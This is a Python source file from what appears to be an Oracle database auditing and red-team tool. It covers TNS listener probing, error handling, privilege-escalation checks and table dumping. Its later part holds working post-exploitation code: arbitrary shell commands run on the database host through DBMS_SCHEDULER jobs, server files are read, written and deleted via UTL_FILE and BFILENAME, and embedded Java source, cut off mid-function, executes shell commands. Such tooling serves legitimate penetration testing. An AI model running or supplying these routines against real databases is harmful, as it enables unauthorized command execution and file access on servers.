"""Oracle Database client helpers used by the Oracle audit stage."""

from __future__ import annotations

import json
import re
import shlex
import socket
import ssl
import struct
import uuid
from dataclasses import dataclass
from typing import Any

from .tls_cache import shared_client_ssl_context


class OracleDependencyError(RuntimeError):
    """Raised when python-oracledb is unavailable at runtime."""


class OracleClientError(RuntimeError):
    """Base normalized Oracle client error."""


class OracleAuthError(OracleClientError):
    """Normalized Oracle authentication/authorization error."""


class OracleAccountLockedError(OracleAuthError):
    """Oracle account is locked."""


class OracleAccountExpiredError(OracleAuthError):
    """Oracle account password is expired."""


class OracleServiceError(OracleClientError):
    """Oracle listener/service/SID error."""


class OracleNotOracleError(OracleClientError):
    """Endpoint does not look like Oracle/TNS."""


class OracleTnsError(OracleClientError):
    """Oracle TNS listener command failed."""


@dataclass(frozen=True)
class OracleConnectConfig:
    host: str
    port: int
    service: str | None = None
    sid: str | None = None
    protocol: str = "tcp"
    wallet: str | None = None
    ssl_server_dn: str | None = None
    insecure: bool = False


_TNS_TYPE_CONNECT = 1
_TNS_TYPE_ACCEPT = 2
_TNS_TYPE_REFUSE = 4
_TNS_TYPE_DATA = 6
_TNS_CONNECT_OFFSET = 58
_WEAK_NNE_TOKENS = ("DES", "3DES", "RC4", "MD5", "NULL")
_ORACLE_IDENT_RE = re.compile(r"^[A-Za-z][A-Za-z0-9_$#]*$")


def _oracle_sql_identifier(raw: str) -> str | None:
    value = str(raw or "").strip()
    if not value:
        return None
    if value.startswith('"') or value.endswith('"'):
        if len(value) < 2 or not (value.startswith('"') and value.endswith('"')):
            return None
        inner = value[1:-1].replace('""', '"')
        return '"' + inner.replace('"', '""') + '"' if inner else None
    if not _ORACLE_IDENT_RE.fullmatch(value):
        return None
    return value.upper()


def _load_oracledb() -> Any:
    try:
        import oracledb
    except ModuleNotFoundError as exc:  # pragma: no cover - exercised through stage fallback/unit monkeypatches
        raise OracleDependencyError(
            "python-oracledb is required for oracle module; install redposture with dependencies"
        ) from exc
    return oracledb


def normalize_oracle_error(exc: BaseException | str | None) -> str:
    text = str(exc or "").strip()
    if not text:
        return "oracle operation failed"
    upper = text.upper()
    mapping = (
        ("ORA-01017", "invalid credentials"),
        ("ORA-28000", "account locked"),
        ("ORA-28001", "account expired"),
        ("ORA-28002", "password will expire soon"),
        ("ORA-12505", "listener does not know SID"),
        ("ORA-12514", "listener does not know service"),
        ("ORA-12526", "listener restricted/blocking new connections"),
        ("ORA-12527", "listener restricted/blocking new connections"),
        ("ORA-12528", "listener restricted/blocking new connections"),
        ("ORA-12541", "connection refused (listener is not available)"),
        ("ORA-12170", "connection timeout"),
        ("DPY-6005", "connection refused (listener is not available)"),
        ("DPY-6003", "connection timeout"),
        # python-oracledb defines DPY-4011 as a connection that was closed by
        # the database or the network.  It is transport evidence, not an
        # authentication verdict (and, on its own, not an Oracle fingerprint).
        ("DPY-4011", "database or network closed the connection"),
    )
    for needle, normalized in mapping:
        if needle in upper:
            return normalized
    lower = text.lower()
    if "timed out" in lower or "timeout" in lower:
        return "connection timeout"
    if "connection refused" in lower:
        return "connection refused (listener is not available)"
    return text


def classify_oracle_error(exc: BaseException | str | None) -> str:
    text = str(exc or "").upper()
    normalized = normalize_oracle_error(exc)
    if "ORA-28000" in text or normalized == "account locked":
        return "account_locked"
    if "ORA-28001" in text or normalized == "account expired":
        return "account_expired"
    if "ORA-01017" in text or "authentication" in normalized:
        return "invalid_credentials"
    if "ORA-12526" in text or "ORA-12527" in text or "ORA-12528" in text:
        return "listener_restricted"
    if "ORA-12505" in text or "ORA-12514" in text:
        return "service_unknown"
    if "ORA-12541" in text or "DPY-6005" in text:
        return "not_oracle"
    if "ORA-12170" in text or "DPY-6003" in text or "timeout" in normalized:
        return "fail"
    return "fail"


def _tns_header(packet_type: int, payload: bytes) -> bytes:
    length = len(payload) + 8
    return struct.pack(">HHBBH", length, 0, packet_type, 0, 0) + payload


def build_tns_connect_packet(connect_data: str) -> bytes:
    data = str(connect_data).encode("ascii", errors="ignore")
    payload = (
        struct.pack(
            ">HHHHHHHHHHIBBIIQQ",
            314,
            300,
            0x0C41,
            8192,
            32767,
            0x7F08,
            0,
            0x0100,
            len(data),
            _TNS_CONNECT_OFFSET,
            512,
            0x41,
            0x41,
            0,
            0,
            0,
            0,
        )
        + data
    )
    return _tns_header(_TNS_TYPE_CONNECT, payload)


def parse_tns_packet(packet: bytes) -> dict[str, Any]:
    if len(packet) < 8:
        raise OracleTnsError("truncated TNS packet header")
    length, checksum, packet_type, reserved, header_checksum = struct.unpack(">HHBBH", packet[:8])
    if length < 8:
        raise OracleTnsError("invalid TNS packet length")
    if len(packet) < length:
        raise OracleTnsError("truncated TNS packet body")
    payload = packet[8:length]
    text = payload.decode("latin-1", errors="ignore")
    printable = "".join(ch if ch == "\n" or 32 <= ord(ch) < 127 else "." for ch in text)
    return {
        "length": length,
        "checksum": checksum,
        "type": packet_type,
        "reserved": reserved,
        "header_checksum": header_checksum,
        "payload": payload,
        "text": text,
        "printable": printable,
    }


def _recv_tns_packets(sock: socket.socket, *, timeout: float) -> list[dict[str, Any]]:
    packets: list[dict[str, Any]] = []
    sock.settimeout(max(0.1, float(timeout)))
    while True:
        try:
            header = sock.recv(8)
            if not header:
                break
            while len(header) < 8:
                chunk = sock.recv(8 - len(header))
                if not chunk:
                    break
                header += chunk
            if len(header) < 8:
                break
            length = struct.unpack(">H", header[:2])[0]
            body = b""
            while len(body) < max(0, length - 8):
                chunk = sock.recv(length - 8 - len(body))
                if not chunk:
                    break
                body += chunk
            packets.append(parse_tns_packet(header + body))
        except TimeoutError:
            break
    return packets


def _extract_parenthesized_fields(text: str) -> dict[str, list[str]]:
    fields: dict[str, list[str]] = {}
    for key, value in re.findall(r"\(([A-Za-z0-9_$#.-]+)=([^()]*)\)", text):
        fields.setdefault(key.upper(), []).append(value)
    return fields


def _tns_clean_text(packets: list[dict[str, Any]]) -> str:
    raw = "\n".join(str(packet.get("text") or "") for packet in packets)
    return "".join(ch if ch in "\n\r\t" or 32 <= ord(ch) < 127 else "" for ch in raw)


def tns_listener_command(
    host: str,
    port: int,
    command: str,
    *,
    timeout: float = 1.0,
    protocol: str = "tcp",
    insecure: bool = False,
) -> dict[str, Any]:
    cmd = re.sub(r"[^A-Za-z0-9_]", "", str(command or "")).lower() or "status"
    connect_data = (
        f"(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=redposture)(HOST={host})(USER=redposture))"
        f"(COMMAND={cmd})(ARGUMENTS=64)(SERVICE={host}:{int(port)})(VERSION=185599488)))"
    )
    packet = build_tns_connect_packet(connect_data)
    raw_sock: socket.socket | None = None
    wrapped_sock: socket.socket | ssl.SSLSocket | None = None
    try:
        raw_sock = socket.create_connection((host, int(port)), timeout=max(0.1, float(timeout)))
        if str(protocol).lower() == "tcps":
            context = shared_client_ssl_context(insecure=insecure)
            wrapped_sock = context.wrap_socket(raw_sock, server_hostname=host)
        else:
            wrapped_sock = raw_sock
        wrapped_sock.sendall(packet)
        packets = _recv_tns_packets(wrapped_sock, timeout=timeout)
        text = _tns_clean_text(packets)
        fields = _extract_parenthesized_fields(text)
        protected = (
            "TNS-01169" in text
            or "ERR=1169" in text.upper()
            or "PASSWORD" in text.upper()
            and ("LISTENER" in text.upper() or "SECURITY" in text.upper())
        )
        restricted = any(
            token in text.upper()
            for token in ("TNS-12526", "TNS-12527", "TNS-12528", "ERR=12526", "ERR=12527", "ERR=12528")
        )
        return {
            "command": cmd,
            "ok": bool(packets),
            "protocol": str(protocol).lower(),
            "packets": packets,
            "text": text,
            "fields": fields,
            "listener_password_protected": protected,
            "listener_restricted": restricted,
            "error": None if packets else "no listener response",
        }
    except Exception as exc:
        return {
            "command": cmd,
            "ok": False,
            "protocol": str(protocol).lower(),
            "packets": [],
            "text": "",
            "fields": {},
            "listener_password_protected": False,
            "listener_restricted": False,
            "error": normalize_oracle_error(exc),
        }
    finally:
        if wrapped_sock is not None and wrapped_sock is not raw_sock:
            close_quietly(wrapped_sock)
        elif raw_sock is not None:
            close_quietly(raw_sock)


def parse_listener_dump(status: dict[str, Any] | None, services: dict[str, Any] | None = None) -> dict[str, Any]:
    status = status or {}
    services = services or {}
    text = "\n".join(
        part
        for part in (
            str(status.get("text") or status.get("payload_text") or ""),
            str(services.get("text") or services.get("payload_text") or ""),
        )
        if part
    )
    fields = _extract_parenthesized_fields(text)
    service_names = sorted(
        set(
            fields.get("SERVICE_NAME", [])
            + fields.get("SERVICE", [])
            + re.findall(r'Service\s+"([^"]+)"', text, flags=re.IGNORECASE)
        )
    )
    sid_names = sorted(
        set(
            fields.get("SID", [])
            + fields.get("INSTANCE_NAME", [])
            + fields.get("INSTANCE", [])
            + re.findall(r'Instance\s+"([^"]+)"', text, flags=re.IGNORECASE)
        )
    )
    version_values = fields.get("VERSION", []) or [item for item in re.findall(r"TNSLSNR[^()\n]+Version[^()\n]+", text)]
    security_values = fields.get("SECURITY", [])
    endpoints = re.findall(r"\(ADDRESS=[^)]+\)\)", text)
    password_protected = bool(
        status.get("listener_password_protected")
        or services.get("listener_password_protected")
        or "TNS-01169" in text
        or "not recognized the password" in text.lower()
    )
    restricted = bool(
        status.get("listener_restricted")
        or services.get("listener_restricted")
        or any(token in text.upper() for token in ("TNS-12526", "TNS-12527", "TNS-12528"))
    )
    return {
        "ok": bool(status.get("ok") or services.get("ok")),
        "status_ok": bool(status.get("ok")),
        "services_ok": bool(services.get("ok")),
        "listener_password_protected": password_protected,
        "listener_restricted": restricted,
        "summary": {"password_protected": password_protected, "restricted": restricted},
        "security": security_values[0] if security_values else None,
        "version": version_values[0] if version_values else None,
        "services": service_names,
        "sids": sid_names,
        "endpoints": endpoints,
        "raw_status": status.get("text") or status.get("payload_text") or "",
        "raw_services": services.get("text") or services.get("payload_text") or "",
        "status_error": status.get("error"),
        "services_error": services.get("error"),
    }


def classify_nne_policy(
    *,
    tcp_available: bool | None = None,
    tcps_available: bool | None = None,
    banners: list[str] | None = None,
) -> dict[str, Any]:
    joined = "\n".join(str(item or "") for item in (banners or [])).upper()
    encrypted = "ENCRYPTION SERVICE" in joined and "INACTIVE" not in joined
    crypto = "CRYPTO-CHECKSUMMING" in joined or "CHECKSUM" in joined
    weak_tokens = [token for token in _WEAK_NNE_TOKENS if token in joined]
    # TCP versus TCPS describes the outer transport only.  Oracle Native
    # Network Encryption is negotiated inside ordinary SQL*Net/TCP, so a TCP
    # listener must never be labelled plaintext/weak without session evidence.
    if encrypted:
        status = "encrypted"
    elif tcps_available and not tcp_available:
        status = "tcps_only"
    else:
        status = "unknown"
    weak = bool(weak_tokens)
    weak_reasons = weak_tokens
    return {
        "status": status,
        "encrypted": encrypted,
        "crypto_checksum": crypto,
        "tcp_available": tcp_available,
        "tcps_available": tcps_available,
        "transport_observation": (
            "tcp_and_tcps"
            if tcp_available and tcps_available
            else "tcp_only"
            if tcp_available
            else "tcps_only"
            if tcps_available
            else "none"
        ),
        "weak": weak,
        "weak_reasons": weak_reasons,
        "reasons": weak_reasons,
        "banners": banners or [],
    }


def build_oracle_dsn(
    host: str,
    port: int,
    *,
    service: str | None = None,
    sid: str | None = None,
    protocol: str = "tcp",
) -> str:
    protocol_text = "tcps" if str(protocol).lower() == "tcps" else "tcp"
    target = str(service or sid or "").strip()
    if target:
        return f"(DESCRIPTION=(ADDRESS=(PROTOCOL={protocol_text})(HOST={host})(PORT={int(port)}))(CONNECT_DATA=({'SERVICE_NAME' if service else 'SID'}={target})))"
    return f"{host}:{int(port)}"


def _connect_kwargs(config: OracleConnectConfig) -> dict[str, Any]:
    kwargs: dict[str, Any] = {}
    if config.wallet:
        kwargs["config_dir"] = config.wallet
        kwargs["wallet_location"] = config.wallet
        kwargs["wallet_password"] = None
    if config.ssl_server_dn:
        kwargs["ssl_server_dn_match"] = not config.insecure
        kwargs["ssl_server_cert_dn"] = config.ssl_server_dn
    elif config.protocol == "tcps":
        kwargs["ssl_server_dn_match"] = not config.insecure
    return kwargs


def connect_oracle(
    config: OracleConnectConfig,
    *,
    username: str | None = None,
    password: str | None = None,
    mode: str | None = None,
    timeout: float = 1.0,
    driver: Any | None = None,
) -> Any:
    oracledb = driver or _load_oracledb()
    dsn = build_oracle_dsn(config.host, config.port, service=config.service, sid=config.sid, protocol=config.protocol)
    kwargs = _connect_kwargs(config)
    try:
        kwargs["tcp_connect_timeout"] = float(timeout)
    except Exception:
        pass
    if mode and str(mode).lower() == "sysdba":
        kwargs["mode"] = getattr(oracledb, "AUTH_MODE_SYSDBA", None)
    try:
        return oracledb.connect(user=username, password=password, dsn=dsn, **kwargs)
    except Exception as exc:
        kind = classify_oracle_error(exc)
        message = normalize_oracle_error(exc)
        if kind == "account_locked":
            raise OracleAccountLockedError(message) from exc
        if kind == "account_expired":
            raise OracleAccountExpiredError(message) from exc
        if kind == "invalid_credentials":
            raise OracleAuthError(message) from exc
        if kind in {"service_unknown", "listener_restricted"}:
            raise OracleServiceError(message) from exc
        raise OracleClientError(message) from exc


def json_safe(value: Any) -> Any:
    try:
        json.dumps(value)
        return value
    except TypeError:
        if isinstance(value, dict):
            return {str(key): json_safe(item) for key, item in value.items()}
        if isinstance(value, (list, tuple)):
            return [json_safe(item) for item in value]
        return str(value)


def _rows_to_dicts(cursor: Any, rows: list[tuple[Any, ...]]) -> list[dict[str, Any]]:
    columns = [str(item[0]).lower() for item in getattr(cursor, "description", []) or []]
    result: list[dict[str, Any]] = []
    for row in rows:
        if columns:
            result.append({columns[idx]: json_safe(value) for idx, value in enumerate(row) if idx < len(columns)})
        else:
            result.append({str(idx): json_safe(value) for idx, value in enumerate(row)})
    return result


class OracleAuditClient:
    def __init__(self, connection: Any) -> None:
        self.connection = connection

    def close(self) -> None:
        close = getattr(self.connection, "close", None)
        if callable(close):
            close()

    def query(
        self, sql: str, params: dict[str, Any] | None = None, *, limit: int | None = None
    ) -> list[dict[str, Any]]:
        cursor = self.connection.cursor()
        try:
            cursor.execute(sql, params or {})
            if limit is None:
                rows = cursor.fetchall()
            else:
                rows = cursor.fetchmany(int(limit))
            return _rows_to_dicts(cursor, list(rows or []))
        finally:
            close = getattr(cursor, "close", None)
            if callable(close):
                close()

    def execute(self, sql: str, params: dict[str, Any] | None = None) -> dict[str, Any]:
        cursor = self.connection.cursor()
        try:
            cursor.execute(sql, params or {})
            commit = getattr(self.connection, "commit", None)
            if callable(commit):
                commit()
            return {"ok": True, "rowcount": getattr(cursor, "rowcount", None)}
        finally:
            close = getattr(cursor, "close", None)
            if callable(close):
                close()

    def server_banner(self) -> dict[str, Any]:
        rows = self.query("select banner_full from v$version", limit=5)
        if not rows:
            rows = self.query("select banner from v$version", limit=5)
        banner = " | ".join(str(row.get("banner_full") or row.get("banner") or "") for row in rows if row)
        version_match = re.search(r"Oracle Database\s+([0-9]+[A-Za-z0-9_.]*)", banner)
        return {"banner": banner or None, "version": version_match.group(1) if version_match else None}

    def current_context(self) -> dict[str, Any]:
        rows = self.query(
            "select sys_context('USERENV','SESSION_USER') as session_user, "
            "sys_context('USERENV','CURRENT_SCHEMA') as current_schema, "
            "sys_context('USERENV','CON_NAME') as con_name, "
            "sys_context('USERENV','CDB_NAME') as cdb_name from dual",
            limit=1,
        )
        return rows[0] if rows else {}

    def network_service_banners(self) -> list[str]:
        for sql in (
            "select network_service_banner from v$session_connect_info where sid = sys_context('USERENV','SID')",
            "select network_service_banner from v$session_connect_info",
        ):
            try:
                rows = self.query(sql, limit=50)
                banners = [
                    str(row.get("network_service_banner") or "") for row in rows if row.get("network_service_banner")
                ]
                if banners:
                    return banners
            except Exception:
                continue
        return []

    def list_pdbs(self) -> list[dict[str, Any]]:
        try:
            return self.query("select name, open_mode, restricted from v$pdbs order by name")
        except Exception:
            return []

    def list_users(self) -> list[dict[str, Any]]:
        for sql in (
            "select username, account_status, default_tablespace, profile from dba_users order by username",
            "select username, account_status, default_tablespace, profile from all_users order by username",
            "select user as username from dual",
        ):
            try:
                return self.query(sql, limit=500)
            except Exception:
                continue
        return []

    def list_roles(self) -> list[dict[str, Any]]:
        try:
            return self.query(
                "select granted_role, admin_option, default_role from user_role_privs order by granted_role", limit=500
            )
        except Exception:
            return []

    def list_privileges(self) -> list[dict[str, Any]]:
        rows: list[dict[str, Any]] = []
        for sql in (
            "select privilege, admin_option from user_sys_privs order by privilege",
            "select privilege, owner, table_name from user_tab_privs order by privilege, owner, table_name",
        ):
            try:
                rows.extend(self.query(sql, limit=1000))
            except Exception:
                continue
        return rows

    def list_schemas(self) -> list[dict[str, Any]]:
        try:
            return self.query("select distinct owner as schema_name from all_tables order by owner", limit=500)
        except Exception:
            return []

    def list_tables(self, schema: str | None = None) -> list[dict[str, Any]]:
        if schema:
            return self.query(
                "select owner, table_name, num_rows from all_tables where owner = upper(:owner) order by owner, table_name",
                {"owner": schema},
                limit=1000,
            )
        return self.query("select owner, table_name, num_rows from all_tables order by owner, table_name", limit=1000)

    def list_directories(self) -> list[dict[str, Any]]:
        for sql in (
            "select directory_name, directory_path from all_directories order by directory_name",
            "select directory_name, directory_path from dba_directories order by directory_name",
        ):
            try:
                rows = self.query(sql, limit=500)
                if rows:
                    return rows
            except Exception:
                continue
        return []

    def resolve_server_path(self, path: str) -> dict[str, Any]:
        raw_path = str(path or "").strip()
        if not raw_path:
            raise OracleClientError("remote path must not be empty")
        directories = self.list_directories()
        normalized = raw_path.replace("\\", "/")
        candidates: list[tuple[int, str, str, str]] = []
        for row in directories:
            directory_name = str(row.get("directory_name") or row.get("name") or "").strip().upper()
            directory_path = str(row.get("directory_path") or row.get("path") or "").strip().replace("\\", "/")
            if not directory_name or not directory_path:
                continue
            base = directory_path.rstrip("/")
            if normalized == base:
                candidates.append((len(base), directory_name, directory_path, ""))
            elif normalized.startswith(base + "/"):
                candidates.append((len(base), directory_name, directory_path, normalized[len(base) + 1 :]))
        if candidates:
            _, directory_name, directory_path, relative_path = sorted(candidates, reverse=True)[0]
            return {
                "directory": directory_name,
                "directory_path": directory_path,
                "relative_path": relative_path or normalized.rsplit("/", 1)[-1],
            }
        if "/" not in normalized:
            for row in directories:
                directory_name = str(row.get("directory_name") or "").strip().upper()
                if directory_name == "DATA_PUMP_DIR":
                    return {
                        "directory": "DATA_PUMP_DIR",
                        "directory_path": row.get("directory_path"),
                        "relative_path": normalized,
                    }
        raise OracleClientError("no visible Oracle DIRECTORY object maps to remote path")

    def dump_table(self, schema: str, table: str, *, limit: int) -> list[dict[str, Any]]:
        owner = _oracle_sql_identifier(schema)
        table_name = _oracle_sql_identifier(table)
        if not owner or not table_name:
            raise OracleClientError("invalid schema/table name")
        return self.query(f"select * from {owner}.{table_name} fetch first {int(limit)} rows only", limit=limit)

    def check_privesc(self) -> list[dict[str, Any]]:
        checks = [
            (
                "CRITICAL",
                "DBA/SYSDBA capability",
                "select case when sys_context('USERENV','ISDBA')='TRUE' then 1 else 0 end as result from dual",
            ),
            ("CRITICAL", "DBA role granted", "select count(*) as result from user_role_privs where granted_role='DBA'"),
            (
                "HIGH",
                "CREATE ANY PROCEDURE privilege",
                "select count(*) as result from user_sys_privs where privilege='CREATE ANY PROCEDURE'",
            ),
            (
                "HIGH",
                "CREATE ANY TRIGGER privilege",
                "select count(*) as result from user_sys_privs where privilege='CREATE ANY TRIGGER'",
            ),
            (
                "HIGH",
                "CREATE JOB / DBMS_SCHEDULER path",
                "select count(*) as result from user_sys_privs where privilege in ('CREATE JOB','CREATE ANY JOB','MANAGE SCHEDULER')",
            ),
            (
                "HIGH",
                "Java execution privileges",
                "select count(*) as result from user_role_privs where granted_role in ('JAVAUSERPRIV','JAVASYSPRIV')",
            ),
            (
                "HIGH",
                "Directory read/write or external table path",
                "select count(*) as result from user_sys_privs where privilege in ('CREATE ANY DIRECTORY','CREATE ANY TABLE')",
            ),
            (
                "HIGH",
                "SELECT ANY DICTIONARY / catalog access",
                "select count(*) as result from user_sys_privs where privilege='SELECT ANY DICTIONARY'",
            ),
            (
                "MEDIUM",
                "DBMS_ADVISOR accessible",
                "select count(*) as result from all_tab_privs where table_name='DBMS_ADVISOR' and privilege='EXECUTE'",
            ),
            ("MEDIUM", "CTXSYS objects accessible", "select count(*) as result from all_objects where owner='CTXSYS'"),
            (
                "MEDIUM",
                "DBMS_CLOUD accessible",
                "select count(*) as result from all_objects where object_name='DBMS_CLOUD'",
            ),
            ("MEDIUM", "Database links visible", "select count(*) as result from all_db_links"),
        ]
        findings: list[dict[str, Any]] = []
        for severity, title, sql in checks:
            try:
                rows = self.query(sql, limit=1)
                raw = next(iter(rows[0].values())) if rows else 0
                count = int(raw or 0)
                ok = count > 0
                findings.append({"severity": severity, "title": title, "result": ok, "count": count, "error": None})
            except Exception as exc:
                findings.append(
                    {
                        "severity": severity,
                        "title": title,
                        "result": None,
                        "count": None,
                        "error": normalize_oracle_error(exc),
                    }
                )
        return findings

    def _read_directory_file_chunk(self, path: str, *, offset: int = 0, amount: int = 32767) -> dict[str, Any]:
        resolved: dict[str, Any]
        resolved = self.resolve_server_path(path)
        cursor = self.connection.cursor()
        try:
            var_factory = getattr(cursor, "var", None)
            if callable(var_factory):
                output_var = var_factory(str)
                cursor.execute(
                    "declare\n"
                    "  l_file bfile := bfilename(:directory_name, :file_name);\n"
                    "  l_raw raw(32767);\n"
                    "begin\n"
                    "  dbms_lob.fileopen(l_file, dbms_lob.file_readonly);\n"
                    "  l_raw := dbms_lob.substr(l_file, :amount, :offset_value);\n"
                    "  :data := utl_raw.cast_to_varchar2(l_raw);\n"
                    "  dbms_lob.fileclose(l_file);\n"
                    "exception\n"
                    "  when others then\n"
                    "    begin\n"
                    "      if dbms_lob.fileisopen(l_file) = 1 then dbms_lob.fileclose(l_file); end if;\n"
                    "    exception when others then null; end;\n"
                    "    raise;\n"
                    "end;",
                    {
                        "directory_name": resolved["directory"],
                        "file_name": resolved["relative_path"],
                        "amount": max(1, min(int(amount), 32767)),
                        "offset_value": max(1, int(offset) + 1),
                        "data": output_var,
                    },
                )
                return {
                    "method": "bfilename",
                    "ok": True,
                    "directory": resolved.get("directory"),
                    "relative_path": resolved.get("relative_path"),
                    "data": output_var.getvalue(),
                    "offset": int(offset),
                    "error": None,
                }
        finally:
            close = getattr(cursor, "close", None)
            if callable(close):
                close()
        rows = self.query(
            "select utl_raw.cast_to_varchar2(dbms_lob.substr(bfilename(:directory_name, :file_name), :amount, :offset_value)) as data from dual",
            {
                "directory_name": resolved["directory"],
                "file_name": resolved["relative_path"],
                "amount": max(1, min(int(amount), 32767)),
                "offset_value": max(1, int(offset) + 1),
            },
            limit=1,
        )
        return {
            "method": "bfilename",
            "ok": bool(rows),
            "directory": resolved.get("directory"),
            "relative_path": resolved.get("relative_path"),
            "data": rows[0].get("data") if rows else None,
            "offset": int(offset),
            "error": None,
        }

    def os_read(self, path: str, *, max_bytes: int = 32767, fs_mode: str = "auto") -> dict[str, Any]:
        try:
            return self._read_directory_file_chunk(path, offset=0, amount=max_bytes)
        except Exception as exc:
            if fs_mode not in {"auto", "scheduler"}:
                return {"method": "bfilename", "ok": False, "data": None, "error": normalize_oracle_error(exc)}
            return self.scheduler_read_file(path, max_bytes=max_bytes)

    def os_write(self, path: str, data: str, *, fs_mode: str = "auto") -> dict[str, Any]:
        try:
            resolved = self.resolve_server_path(path)
            directory_name = str(resolved["directory"])
            file_name = str(resolved["relative_path"])
            try:
                self.execute(
                    "begin utl_file.fremove(:directory_name, :file_name); exception when others then null; end;",
                    {"directory_name": directory_name, "file_name": file_name},
                )
            except Exception:
                pass
            chunks = [str(data)[idx : idx + 30000] for idx in range(0, len(str(data)), 30000)] or [""]
            for index, chunk in enumerate(chunks):
                mode = "w" if index == 0 else "a"
                self.execute(
                    "declare f utl_file.file_type; begin "
                    "f := utl_file.fopen(:directory_name, :file_name, :mode, 32767); "
                    "utl_file.put(f, :content); "
                    "utl_file.fclose(f); "
                    "end;",
                    {
                        "directory_name": directory_name,
                        "file_name": file_name,
                        "mode": mode,
                        "content": chunk,
                    },
                )
            return {
                "method": "utl_file",
                "ok": True,
                "directory": directory_name,
                "relative_path": file_name,
                "bytes": len(str(data).encode("utf-8")),
                "error": None,
            }
        except Exception as exc:
            if fs_mode not in {"auto", "scheduler"}:
                return {"method": "utl_file", "ok": False, "bytes": 0, "error": normalize_oracle_error(exc)}
            return self.scheduler_write_file(path, data)

    def os_delete(self, path: str, *, fs_mode: str = "auto") -> dict[str, Any]:
        try:
            resolved = self.resolve_server_path(path)
            self.execute(
                "begin utl_file.fremove(:directory_name, :file_name); end;",
                {"directory_name": resolved["directory"], "file_name": resolved["relative_path"]},
            )
            return {
                "method": "utl_file",
                "ok": True,
                "directory": resolved.get("directory"),
                "relative_path": resolved.get("relative_path"),
                "error": None,
            }
        except Exception as exc:
            if fs_mode not in {"auto", "scheduler"}:
                return {"method": "utl_file", "ok": False, "error": normalize_oracle_error(exc)}
            target_path = self._resolve_scheduler_path(path)
            result = self.scheduler_exec(f"rm -f -- {shlex.quote(target_path)}")
            return {**result, "method": "scheduler_delete", "target_path": target_path}

    def _data_pump_directory(self) -> dict[str, Any]:
        for row in self.list_directories():
            if str(row.get("directory_name") or "").upper() == "DATA_PUMP_DIR":
                return row
        directories = self.list_directories()
        if directories:
            return directories[0]
        raise OracleClientError("no visible Oracle DIRECTORY object for staging")

    def _resolve_scheduler_path(self, path: str) -> str:
        try:
            resolved = self.resolve_server_path(path)
        except Exception:
            return str(path)
        directory_path = str(resolved.get("directory_path") or "").rstrip("/")
        relative_path = str(resolved.get("relative_path") or "").lstrip("/")
        if directory_path and relative_path:
            return f"{directory_path}/{relative_path}"
        if directory_path:
            return directory_path
        return str(path)

    def scheduler_read_file(self, path: str, *, max_bytes: int = 32767) -> dict[str, Any]:
        try:
            stage = self._data_pump_directory()
            stage_dir = str(stage.get("directory_path") or "").rstrip("/")
            stage_name = f"rp_read_{uuid.uuid4().hex[:10]}.txt"
            source_path = self._resolve_scheduler_path(path)
            command = (
                f"head -c {int(max_bytes)} -- {shlex.quote(source_path)} > {shlex.quote(stage_dir + '/' + stage_name)}"
            )
            exec_result = self.scheduler_exec(command)
            if not exec_result.get("ok"):
                return {"method": "scheduler_readback", "ok": False, "data": None, "error": exec_result.get("error")}
            readback = self._read_directory_file_chunk(stage_name, offset=0, amount=max_bytes)
            cleanup = self.os_delete(stage_name, fs_mode="directory")
            return {
                **readback,
                "method": "scheduler_readback",
                "source_path": source_path,
                "cleanup_ok": cleanup.get("ok"),
            }
        except Exception as exc:
            return {"method": "scheduler_readback", "ok": False, "data": None, "error": normalize_oracle_error(exc)}

    def scheduler_write_file(self, path: str, data: str) -> dict[str, Any]:
        try:
            stage = self._data_pump_directory()
            stage_dir = str(stage.get("directory_path") or "").rstrip("/")
            stage_name = f"rp_write_{uuid.uuid4().hex[:10]}.txt"
            target_path = self._resolve_scheduler_path(path)
            staged = self.os_write(stage_name, data, fs_mode="directory")
            if not staged.get("ok"):
                return {**staged, "method": "scheduler_writeback"}
            command = f"cp -- {shlex.quote(stage_dir + '/' + stage_name)} {shlex.quote(target_path)}"
            exec_result = self.scheduler_exec(command)
            cleanup = self.os_delete(stage_name, fs_mode="directory")
            return {
                "method": "scheduler_writeback",
                "ok": bool(exec_result.get("ok")),
                "bytes": len(str(data).encode("utf-8")),
                "stage_file": stage_name,
                "target_path": target_path,
                "cleanup_ok": cleanup.get("ok"),
                "error": exec_result.get("error"),
            }
        except Exception as exc:
            return {"method": "scheduler_writeback", "ok": False, "bytes": 0, "error": normalize_oracle_error(exc)}

    def scheduler_exec(self, command: str, *, capture_output: bool = False) -> dict[str, Any]:
        job_name = f"REDPOSTURE_JOB_{uuid.uuid4().hex[:16].upper()}"
        output_file = ""
        command_to_run = command
        if capture_output:
            try:
                stage = self._data_pump_directory()
                stage_dir = str(stage.get("directory_path") or "").rstrip("/")
                output_file = f"rp_exec_{uuid.uuid4().hex[:10]}.txt"
                command_to_run = (
                    f"({command}) > {shlex.quote(stage_dir + '/' + output_file)} 2>&1; "
                    f"echo __redposture_exit_code=$? >> {shlex.quote(stage_dir + '/' + output_file)}"
                )
            except Exception:
                output_file = ""
        plsql = (
            "begin\n"
            "dbms_scheduler.create_job(job_name=>:job_name, job_type=>'EXECUTABLE', "
            "job_action=>'/bin/sh', number_of_arguments=>2, enabled=>false, auto_drop=>false);\n"
            "dbms_scheduler.set_job_argument_value(:job_name, 1, '-c');\n"
            "dbms_scheduler.set_job_argument_value(:job_name, 2, :cmd);\n"
            "dbms_scheduler.run_job(:job_name, use_current_session=>true);\n"
            "begin dbms_scheduler.drop_job(:job_name, force=>true); exception when others then null; end;\n"
            "end;"
        )
        result = self.execute(plsql, {"job_name": job_name, "cmd": command_to_run})
        response = {
            "ok": bool(result.get("ok")),
            "job_name": job_name,
            "rowcount": result.get("rowcount"),
            "output": None,
            "output_available": False,
            "error": None,
        }
        if capture_output and output_file:
            readback = self.os_read(output_file, fs_mode="directory")
            cleanup = self.os_delete(output_file, fs_mode="directory")
            response.update(
                {
                    "output": readback.get("data"),
                    "output_available": bool(readback.get("ok")),
                    "output_file": output_file,
                    "cleanup_ok": cleanup.get("ok"),
                    "readback_error": readback.get("error"),
                }
            )
        return response

    def java_exec(self, command: str) -> dict[str, Any]:
        source = r"""
import java.io.*;
public class RedpostureExec {
  public static String run(String cmd) throws Exception {
    Process p = new ProcessBuilder("/bin/sh", "-c", cmd).redirectErrorStream(true).start();
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    InputStream in = p.getInputStream();
    byte[] buf = new byte[4096];
    int n;
    while ((n = in.read(buf)) != -1) { out.write(buf, 0, n); }
    int rc = p.waitFor();
    return "exit_code=" + rc + "\n" + out.toString("UTF-8");
  }
}
"""
        try:
